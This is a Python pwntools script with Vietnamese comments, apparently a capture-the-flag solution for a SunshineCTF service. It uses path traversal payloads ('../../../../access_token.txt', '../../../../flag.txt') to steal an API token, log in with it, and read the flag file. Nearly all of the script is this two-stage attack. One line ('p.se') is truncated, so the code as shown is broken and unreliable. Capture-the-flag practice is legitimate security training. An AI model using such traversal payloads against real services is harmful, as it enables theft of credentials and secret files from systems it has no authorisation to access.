from pwn import *

# --- Cấu hình ---
HOST = 'astrojit.sunshinectf.games'
PORT = 25006
context.log_level = 'info'

# --- Giai đoạn 1: Lấy API Token ---

log.info("--- Giai đoạn 1: Lấy API Token ---")
try:
    p = remote(HOST, PORT)

    # Vào guest mode
    p.recvuntil(b'Enter API token, or hit enter to use guest mode:')
    p.sendline(b'')
    
    p.recvuntil(b'Enter an option:')
    p.sendline(b'1')
    
    p.se
    
    # Chọn Lựa chọn 3
    p.recvuntil(b'Enter an option:')
    p.sendline(b'3')
    
    # Dùng Path Traversal để đọc access_token.txt
    p.recvuntil(b'Email ID:')
    # Sử dụng nhiều ../ để đảm bảo thoát ra khỏi thư mục hiện tại
    payload_token = b'../../../../access_token.txt'
    p.sendline(payload_token)
    log.info(f"Đã gửi payload để đọc token: {payload_token.decode()}")

    # Nhận và xử lý output
    response = p.recvuntil(b'AI Response:').decode()
    # Token sẽ nằm giữa "Title:" và "AI Response:"
    api_token = response.split('Title:')[1].split('AI Response:')[0].strip()
    
    log.success(f"Đã tìm thấy API Token: {api_token}")
    p.close()

except Exception as e:
    log.error(f"Giai đoạn 1 thất bại: {e}")
    exit()

# --- Giai đoạn 2: Dùng API Token để lấy Flag ---

log.info("\n--- Giai đoạn 2: Dùng Token để lấy Flag ---")
try:
    p = remote(HOST, PORT)

    # Đăng nhập bằng API token đã tìm thấy
    p.recvuntil(b'Enter API token, or hit enter to use guest mode:')
    p.sendline(api_token.encode())
    log.info("Đã đăng nhập bằng API Token.")
    
    # Chọn Lựa chọn 3
    p.recvuntil(b'Enter an option:')
    p.sendline(b'3')
    
    # Dùng Path Traversal để đọc flag.txt
    p.recvuntil(b'Email ID:')
    payload_flag = b'../../../../flag.txt'
    p.sendline(payload_flag)
    log.info(f"Đã gửi payload để đọc flag: {payload_flag.decode()}")

    # Đọc toàn bộ output để lấy flag
    final_response = p.recvall(timeout=5).decode(errors='ignore')
    
    print("\n" + "="*20 + " OUTPUT CUỐI CÙNG " + "="*20)
    print(final_response)
    print("="*58)

except Exception as e:
    log.error(f"Giai đoạn 2 thất bại: {e}")